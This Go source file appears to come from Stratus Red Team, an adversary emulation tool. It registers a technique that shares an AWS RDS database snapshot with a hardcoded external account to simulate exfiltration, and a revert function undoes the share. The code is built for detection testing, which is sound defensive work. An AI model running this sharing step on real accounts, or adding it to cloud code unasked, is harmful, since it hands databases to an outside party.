package aws

import (
	"context"
	_ "embed"
	"errors"
	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/rds"
	"github.com/datadog/stratus-red-team/internal/providers"
	"github.com/datadog/stratus-red-team/pkg/stratus"
	"github.com/datadog/stratus-red-team/pkg/stratus/mitreattack"
	"log"
)

//go:embed main.tf
var tf []byte

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:                 "aws.exfiltration.rds-snapshot-sharing",
		FriendlyName:       "Exfiltrate RDS Snapshot by Sharing",
		Platform:           stratus.AWS,
		IsSlow:             true,
		IsIdempotent:       true,
		MitreAttackTactics: []mitreattack.Tactic{mitreattack.Exfiltration},
		Description: `
Shares a RDS Snapshot with an external AWS account to simulate an attacker exfiltrating a database.

Warm-up:

- Create a RDS Instance (slow, around 10 minutes)
- Create a RDS Snapshot

Detonation:

- Call rds:ModifyDBSnapshotAttribute to share the snapshot with an external AWS account
`,
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

var AccountIdToShareWith = []string{"193672423079"}

func detonate(params map[string]string) error {
	snapshotId := params["snapshot_id"]
	rdsClient := rds.NewFromConfig(providers.AWS().GetConnection())

	log.Println("Sharing RDS Snapshot " + snapshotId + " with an external AWS account")
	_, err := rdsClient.ModifyDBSnapshotAttribute(context.Background(), &rds.ModifyDBSnapshotAttributeInput{
		DBSnapshotIdentifier: aws.String(snapshotId),
		AttributeName:        aws.String("restore"),
		ValuesToAdd:          AccountIdToShareWith,
	})

	if err != nil {
		return errors.New("unable to share RDS snapshot: " + err.Error())
	}

	return nil
}

func revert(params map[string]string) error {
	snapshotId := params["snapshot_id"]
	rdsClient := rds.NewFromConfig(providers.AWS().GetConnection())

	log.Println("Un-sharing RDS Snapshot " + snapshotId + " with an external AWS account")
	_, err := rdsClient.ModifyDBSnapshotAttribute(context.Background(), &rds.ModifyDBSnapshotAttributeInput{
		DBSnapshotIdentifier: aws.String(snapshotId),
		AttributeName:        aws.String("restore"),
		ValuesToRemove:       AccountIdToShareWith,
	})

	if err != nil {
		return errors.New("unable to unshare RDS snapshot: " + err.Error())
	}

	return nil
}
